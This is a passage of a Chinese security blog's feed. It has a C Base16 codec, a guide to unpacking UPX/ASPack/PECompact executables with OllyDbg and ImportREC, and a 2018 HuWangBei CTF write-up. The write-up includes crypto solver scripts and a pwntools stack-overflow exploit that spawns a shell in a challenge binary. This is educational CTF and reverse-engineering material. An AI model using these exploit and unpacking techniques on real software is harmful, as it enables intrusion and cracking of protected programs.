class="number">2</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">6</span>] = (s[i + <span class="number">3</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0F</span>;</span><br><span class="line">        res[j + <span class="number">7</span>] = s[i + <span class="number">3</span>] &amp; <span class="number">0x0F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; res_len; j++) &#123;</span><br><span class="line">        res[j] = base16payload[res[j]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base16_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> res_len = len / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, res_len + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> count = len / <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> s_index = i * <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">int</span> res_index = i * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">int</span> buffer[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            buffer[j] = find_pos(s[s_index + j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> sign;</span><br><span class="line">        <span class="keyword">if</span>(i == count - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(buffer[j] == <span class="number">0x10</span>) &#123;</span><br><span class="line">                    sign++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index] = ((buffer[<span class="number">0</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">1</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">1</span>] = ((buffer[<span class="number">2</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">3</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">2</span>] = ((buffer[<span class="number">4</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">5</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">        <span class="keyword">if</span>(sign == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        res[res_index + <span class="number">3</span>] = ((buffer[<span class="number">6</span>] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (buffer[<span class="number">7</span>] &amp; <span class="number">0x0F</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> s1[MAX];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s1);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s2 = base16_encode((<span class="keyword">const</span> <span class="keyword">char</span> *)s1, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s2);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *s3 = base16_decode((<span class="keyword">const</span> <span class="keyword">char</span> *)s2, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s2));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s3);</span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="built_in">free</span>(s3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;承接之前&lt;a href=&quot;https://qianfei11.github.io/2018/05/12/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0base64%E8%A7%A3%E5%AF%86%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/&quot;&gt;Base64的文章&lt;/a&gt;，实现了一下Base32和Base16，原理是一样的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="c" scheme="https://qianfei11.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>脱壳指南</title>
    <link href="https://qianfei11.github.io/2018/11/29/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%91%E8%84%B1%E5%A3%B3%E6%8C%87%E5%8D%97/"/>
    <id>https://qianfei11.github.io/2018/11/29/【未完成】脱壳指南/</id>
    <published>2018-11-29T09:04:10.000Z</published>
    <updated>2019-02-18T09:09:41.427Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下脱一些简单壳的过程（主要是找OEP）。</p><a id="more"></a><h1 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h1><ul><li>调试工具：<code>Ollydbg</code></li><li>查壳工具：<code>ExeInfo</code>/<code>PEID</code></li><li>脱壳工具：<code>LordPE</code>、<code>ImportRE</code></li></ul><p>OD快捷键：</p><table><thead><tr><th style="text-align:center">快捷键</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>f7</code></td><td style="text-align:center">单步步入</td></tr><tr><td style="text-align:center"><code>f8</code></td><td style="text-align:center">单步步过</td></tr><tr><td style="text-align:center"><code>f4</code></td><td style="text-align:center">运行到选定位置</td></tr><tr><td style="text-align:center"><code>f2</code></td><td style="text-align:center">设置断点</td></tr><tr><td style="text-align:center"><code>ctrl+f2</code></td><td style="text-align:center">重新开始</td></tr><tr><td style="text-align:center"><code>f9</code></td><td style="text-align:center">运行</td></tr><tr><td style="text-align:center"><code>shift+f9</code></td><td style="text-align:center">忽略异常运行</td></tr><tr><td style="text-align:center"><code>alt+f9</code></td><td style="text-align:center">执行到用户代码</td></tr></tbody></table><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><h2 id="LordPE"><a href="#LordPE" class="headerlink" title="LordPE"></a>LordPE</h2><p>LordPE用来将程序dump出来：</p><ol><li>找到程序右键，<code>修正镜像大小</code>；</li><li><code>完整转存</code>。</li></ol><p><img src="/pics/脱壳指南/1.png" alt="LordPE步骤"></p><h2 id="ImportREC"><a href="#ImportREC" class="headerlink" title="ImportREC"></a>ImportREC</h2><p>ImportREC用来修改OEP和一些IAT：</p><ol><li>找到程序，输入找到的<code>OEP</code>的值；</li><li>点击<code>IAT自动搜索</code>；</li><li><code>获取导入表</code>；</li><li><code>显示无效的</code>，如果有无效的表清除即可；</li><li><code>修正转储</code>。</li></ol><p><img src="/pics/脱壳指南/2.png" alt="ImportREC步骤"></p><p>了解了脱壳的方法后，我们需要做的就是找到OEP。</p><h1 id="压缩壳"><a href="#压缩壳" class="headerlink" title="压缩壳"></a>压缩壳</h1><p>压缩壳的特点是减小软件体积大小，主要目的起对软件的压缩，加密保护不是重点。例如：UPX、ASPack等等。</p><ul><li><code>UPX</code>（the Ultimate Packer for eXecutables）是一个免费且开源的可执行程序文件加壳器，支持许多不同操作系统下的可执行文件格式。</li><li><code>ASPack</code>是一种可压缩32位Windows<code>EXE</code>文件与<code>DLL</code>文件的压缩工具，能将大多数EXE文件及DLL文件平均压缩百分之三十到四十的压缩率。</li><li><code>kkrunchy</code>是一个<code>64K Demo</code>专用的压缩工具，压缩率非常高。</li><li><code>NSPack</code>是一款支持<code>EXE</code>/<code>DLL</code>/<code>OCX</code>/<code>SCR</code>等类型的文件进行压缩。可以兼容64位操作系统。</li><li><code>PECompact</code>是一款能压缩可执行文件（后缀为<code>EXE</code>）的压缩加壳工具，压缩率极高，压缩后的程序无需解压即可直接运行，通过压缩代码、数据、相关资源使压缩能达到100%。</li></ul><h2 id="单步执行法"><a href="#单步执行法" class="headerlink" title="单步执行法"></a>单步执行法</h2><p>以UPX为例。单步执行法，通过单步执行一步一步，找到OEP（程序入口点）。如果遇到向下的跳转则默认跳转：</p><p><img src="/pics/脱壳指南/3.png" alt="向下跳转f7实现"></p><p>遇到向上的跳转则直接执行到下一条语句，即f4：</p><p><img src="/pics/脱壳指南/4.png" alt="向上跳转"></p><p><img src="/pics/脱壳指南/5.png" alt="f4到下一条语句"></p><p>最后执行到<code>popad</code>处会有一个大范围的<code>jmp</code>，即转到OEP。</p><h2 id="ESP定律法"><a href="#ESP定律法" class="headerlink" title="ESP定律法"></a>ESP定律法</h2><p>以UPX为例。利用压缩前后ESP不变的定律。在指令<code>pushad</code>时单步一下，会发现寄存器中只有<code>ESP</code>发生变化：</p><p><img src="/pics/脱壳指南/6.png" alt="只有ESP的值发生改变"></p><p>然后右键ESP的值，跟随数据窗口：</p><p><img src="/pics/脱壳指南/7.png" alt="跟随数据窗口"></p><p>再在数据窗口中硬件访问，设下断点：</p><p><img src="/pics/脱壳指南/8.png" alt="设置硬件断点"></p><p>同样也可以通过<code>dd xxxxxxxx</code>或者<code>hr xxxxxxxx</code>设下硬件断点，在下方command处输入：</p><p><img src="/pics/脱壳指南/9.png" alt="dd命令"></p><p><img src="/pics/脱壳指南/10.png" alt="hr命令"></p><p>然后f9继续执行到<code>popad</code>后，删去硬件断点：</p><p><img src="/pics/脱壳指南/11.png" alt="删除硬件断点"></p><p>f7到达OEP。</p><h2 id="特殊的ESP定律法"><a href="#特殊的ESP定律法" class="headerlink" title="特殊的ESP定律法"></a>特殊的ESP定律法</h2><p>以FSG2.0为例。不遵循ESP不变的定律，FSG2.0专用的方法。单步走到<code>popad</code>的下一条指令，观察堆栈窗口从上往下数第四个地址的值即为OEP的地址。右键在反汇编窗口跟随：</p><p><img src="/pics/脱壳指南/26.png" alt="第四个值在反汇编窗口跟随"></p><p>下硬件断点后f9运行，到达OEP。</p><h2 id="二次内存镜像法"><a href="#二次内存镜像法" class="headerlink" title="二次内存镜像法"></a>二次内存镜像法</h2><p>以UPX为例。进入内存段中，先找到程序段的第一个<code>.rsrc</code>，并设下断点后执行：</p><p><img src="/pics/脱壳指南/12.png" alt="程序段第一个.rsrc"></p><p>再在内存段中的<code>0x00401000</code>处设下断点，再执行</p><p><img src="/pics/脱壳指南/13.png" alt="0x00401000处"></p><p>然后按照单步执行法往下走就能看到<code>popad</code>还有jmp：</p><p><img src="/pics/脱壳指南/14.png" alt="看到popad"></p><h2 id="一步直达法"><a href="#一步直达法" class="headerlink" title="一步直达法"></a>一步直达法</h2><p>以UPX为例。在遇到指令<code>pushad</code>后，通过经验可以判断必存在<code>popad</code>，直接搜索指令找到OEP：</p><p><img src="/pics/脱壳指南/15.png" alt="搜索指令"></p><p><img src="/pics/脱壳指南/16.png" alt="不需要选整个块"></p><h2 id="模拟跟踪法"><a href="#模拟跟踪法" class="headerlink" title="模拟跟踪法"></a>模拟跟踪法</h2><p>以ASPack为例。先进入内存中，找到SFX：</p><p><img src="/pics/脱壳指南/17.png" alt="找到SFX"></p><p>在命令框输入<code>tc eip&lt;xxxxxxxx</code>：</p><p><img src="/pics/脱壳指南/18.png" alt="输入tc命令"></p><p>会看到OD左上角变成了跟踪：</p><p><img src="/pics/脱壳指南/19.png" alt="左上角变成了跟踪"></p><p>等待一段时间就会跳转到OEP。</p><h2 id="SFX模拟跟踪法"><a href="#SFX模拟跟踪法" class="headerlink" title="SFX模拟跟踪法"></a>SFX模拟跟踪法</h2><p>以ASPack为例。进入<code>选项-&gt;调试设置</code>（<code>Alt+O</code>）：</p><p><img src="/pics/脱壳指南/20.png" alt="调试设置"></p><p>一般情况选择块方式跟踪或者字节方式，这里选择前者：</p><p><img src="/pics/脱壳指南/21.png" alt="选择块方式跟踪"></p><p>确定后，重新载入（<code>Ctrl+f2</code>），直接跳到了OEP。</p><h2 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h2><p>以PECompact为例。先在调试选项中忽略所有异常：</p><p><img src alt></p><p>重新载入后，执行m次shift+f9，直到程序跑飞。然后重新载入程序，执行m-1次shift+f9。在堆栈窗口中找到<code>SE句柄</code>，然后ctrl+g转到SE句柄：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0045DE74    B8 F9CB45F0     mov eax,0xF045CBF9</span><br><span class="line">0045DE79    8D88 9E120010   lea ecx,dword ptr ds:[eax+0x1000129E]</span><br><span class="line">0045DE7F    8941 01         mov dword ptr ds:[ecx+0x1],eax</span><br><span class="line">0045DE82    8B5424 04       mov edx,dword ptr ss:[esp+0x4]</span><br><span class="line">0045DE86    8B52 0C         mov edx,dword ptr ds:[edx+0xC]</span><br><span class="line">0045DE89    C602 E9         mov byte ptr ds:[edx],0xE9</span><br><span class="line">0045DE8C    83C2 05         add edx,0x5</span><br><span class="line">0045DE8F    2BCA            sub ecx,edx                              ; ntdll_1.7720353D</span><br><span class="line">0045DE91    894A FC         mov dword ptr ds:[edx-0x4],ecx           ; qqspirit.0045DE74</span><br><span class="line">0045DE94    33C0            xor eax,eax</span><br><span class="line">0045DE96    C3              retn</span><br><span class="line">0045DE97    B8 78563412     mov eax,0x12345678                       ; 下断点</span><br></pre></td></tr></table></figure><p>随后执行到断点处，单步跟到OEP。</p><h1 id="加密壳"><a href="#加密壳" class="headerlink" title="加密壳"></a>加密壳</h1><p>加密壳主要就是针对软件的加密保护，也有一些人用加密壳来做一些木马的免杀，导致一些杀软件查到该壳就误报病毒。加密壳的种类有很多，如果手工脱和修复，即使对高手来脱，也需要费很大力气。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>有时候脱完壳却不能运行程序，需要修复IAT。首先载入OD，在OEP往下找<code>call</code>：</p><p><img src="/pics/脱壳指南/22.png" alt="找到call"></p><p>找到后在命令框处输入<code>d xxxxxx</code>：</p><p><img src="/pics/脱壳指南/23.png" alt="数据窗口中跟随"></p><p>在数据窗口中，往上查找，直到数据为0，记录下IAT地址；往下也同样：</p><p><img src="/pics/脱壳指南/24.png" alt="查找首尾地址"></p><p>在<code>ImportREC</code>中修改OEP后，不采取自动获取的方式，手动输入IAT起始地址和大小，偷懒的办法是大小直接输1000：</p><p><img src="/pics/脱壳指南/25.png" alt="ImportREC修改"></p><p>然后清除掉无效的，转储一下得到完整程序。</p><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.cnblogs.com/hongyuyingxiao/p/9630173.html" target="_blank" rel="noopener">https://www.cnblogs.com/hongyuyingxiao/p/9630173.html</a><br><a href="https://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/" target="_blank" rel="noopener">https://findream.github.io/2018/07/15/%E5%B8%B8%E8%A7%81%E5%A3%B3%E7%9A%84%E8%84%B1%E5%A3%B3%E6%80%9D%E8%B7%AF/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下脱一些简单壳的过程（主要是找OEP）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>2018-护网杯-review</title>
    <link href="https://qianfei11.github.io/2018/10/16/2018-%E6%8A%A4%E7%BD%91%E6%9D%AF-review/"/>
    <id>https://qianfei11.github.io/2018/10/16/2018-护网杯-review/</id>
    <published>2018-10-16T10:18:29.000Z</published>
    <updated>2019-01-26T13:24:28.190Z</updated>
    
    <content type="html"><![CDATA[<p>看着大佬们的wp复现一波。</p><a id="more"></a><h1 id="迟到的签到题"><a href="#迟到的签到题" class="headerlink" title="迟到的签到题"></a>迟到的签到题</h1><p>充分证明了自己是个签到题选手。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">enc = <span class="string">''</span></span><br><span class="line">enc = base64.b64decode(enc)</span><br><span class="line"><span class="comment"># test = 'flag&#123;'</span></span><br><span class="line"><span class="comment"># for i in range(len(test)):</span></span><br><span class="line"><span class="comment">#     print chr(ord(test) ^ ord(enc)),</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    flag += chr(ord(enc[i]) ^ ord(<span class="string">'f'</span>))</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="FEZ"><a href="#FEZ" class="headerlink" title="FEZ"></a>FEZ</h1><p>给出了一个py实现的加密算法，和一个被加密后输出的log。了解一下之后，大概是菲斯特尔(Feistel)密码，也就是DES。</p><p>分析一下，可以发现比较难的点是中间的多次繁琐的异或，逆向实现较难。通过正向分析加密的过程来观察。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// l即左半部分，r即右半部分</span><br><span class="line">   l + r</span><br><span class="line">1. r + r^l^k1</span><br><span class="line">2. r^l^k1 + r^l^k1^r^k2 =&gt; r^l^k1 + l^k1^k2</span><br><span class="line">3. l^k1^k2 + l^k1^k2^r^l^k1^k3 =&gt; l^k1^k2 + r^k2^k3</span><br><span class="line">4. r^k2^k3 + r^k2^k3^l^k1^k2^k4 =&gt; r^k2^k3 + r^l^k1^k3^k4</span><br><span class="line">5. r^l^k1^k3^k4 + r^l^k1^k3^k4^r^k2^k3^k5 =&gt; r^l^k1^k3^k4 + l^k1^k2^k4^k5</span><br><span class="line">6. l^k1^k2^k4^k5 + l^k1^k2^k4^k5^r^l^k1^k3^k4^k6 =&gt; l^k1^k2^k4^k5 + r^k2^k3^k5^k6</span><br><span class="line">7. r^k2^k3^k5^k6 + r^k2^k3^k5^k6^l^k1^k2^k4^k5^k7 =&gt; r^k2^k3^k5^k6 + r^l^k1^k3^k4^k6^k7</span><br><span class="line"></span><br><span class="line">// 对于m和test来说是一样的</span><br><span class="line">enc1 = xor(test, k) = t_r^k2^k3^k5^k6 + t_r^t_l^k1^k3^k4^k6^k7</span><br><span class="line">enc2 = xor(m, k) = m_r^k2^k3^k5^k6 + m_r^m_l^k1^k3^k4^k6^k7</span><br></pre></td></tr></table></figure><p>由于test的值是已知的，可以先利用test的左右两部分求出k2356和k13467。然后再利用这两个数求出m的左右两部分，m中就含有flag。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">test = <span class="string">'8664f7f564f097907c082328ebcdc95e8dc37eec3827fd9c93cc84ebb517c5e396c19d12e730ee3f3fb9e84110f9c92b29ddeab60797'</span></span><br><span class="line">enc1 = <span class="string">'4b4ce14cdb9ace2c678b9a64892cc9d5f2a61e7e2dc256877f2fb454c4d37760278640ab1737c62ba4a403acb14a893facfc1819b259'</span></span><br><span class="line">enc2 = <span class="string">'d4c898ee5f6b68d6120bd7fb11f5cf4d0431324c40e0b3a6ae9fbd1f17295be643c45ec7f306063dd1009ae5d62b0803c7909629aba7'</span></span><br><span class="line"></span><br><span class="line">t_l = test.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>]</span><br><span class="line">t_r = test.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:]</span><br><span class="line"></span><br><span class="line">k2356 = xor(enc1.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>], t_r)</span><br><span class="line">k13467 = xor(xor(enc1.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:], t_r), t_l)</span><br><span class="line"></span><br><span class="line">m_r = xor(enc2.decode(<span class="string">'hex'</span>)[:<span class="number">27</span>], k2356)</span><br><span class="line">m_l = xor(xor(enc2.decode(<span class="string">'hex'</span>)[<span class="number">27</span>:], m_r), k13467)</span><br><span class="line">flag = m_l + m_r</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="GETTINGSTART"><a href="#GETTINGSTART" class="headerlink" title="GETTINGSTART"></a>GETTINGSTART</h1><p>拿到题目跑了一下，然后checksec看看开了什么保护：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">qianfei@qianfeideMacBook-Air ~/ti/2018 huwangbei/GETTINGSTART checksec task_gettingStart_ktQeERc</span><br><span class="line">[*] &apos;/Users/qianfei/ti/2018 huwangbei/GETTINGSTART/task_gettingStart_ktQeERc&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>拖进ida里看一看，就是很明显的栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">double</span> v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span>LL;</span><br><span class="line">  v8 = <span class="number">1.797693134862316e308</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %lu seconds...\n"</span>, <span class="number">0L</span>L, <span class="number">1.797693134862316e308</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"But Whether it starts depends on you."</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v7 != <span class="number">0x7FFFFFFFFFFFFFFF</span>LL || v8 != <span class="number">0.1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HuWangBei CTF 2018 will be getting start after %g seconds...\n"</span>, &amp;buf, v8);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>buf</code>和<code>v7</code>还有<code>v8</code>之间的相对位置也比较清楚，主要就是解决double的<code>0.1</code>在内存中存储是什么样子的。通过写一个小的c程序得到结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n = *(<span class="keyword">long</span> <span class="keyword">long</span>*)&amp;x;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%llX"</span>, n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为<code>0x3FB999999999999A</code>，也就是<code>-1</code>的值。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./task1'</span>)</span><br><span class="line">v7 = <span class="number">0x7FFFFFFFFFFFFFFF</span></span><br><span class="line">v8 = <span class="number">0x3FB999999999999A</span></span><br><span class="line">offset = <span class="number">0x28</span></span><br><span class="line">payload = (p64(v7) + p64(v8)).rjust(offset, <span class="string">'\0'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="RERERE"><a href="#RERERE" class="headerlink" title="RERERE"></a>RERERE</h1><p>此处记录<a href="https://xz.aliyun.com/t/2892#toc-7" target="_blank" rel="noopener">lilac的writeup</a></p><p>通过搜索字符串找到程序校验位置，分析虚表中的函数，发现这又是一个虚拟机，因此只需要按照套路将每一个虚拟机的指令分析清楚，最终分析得到的虚表是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 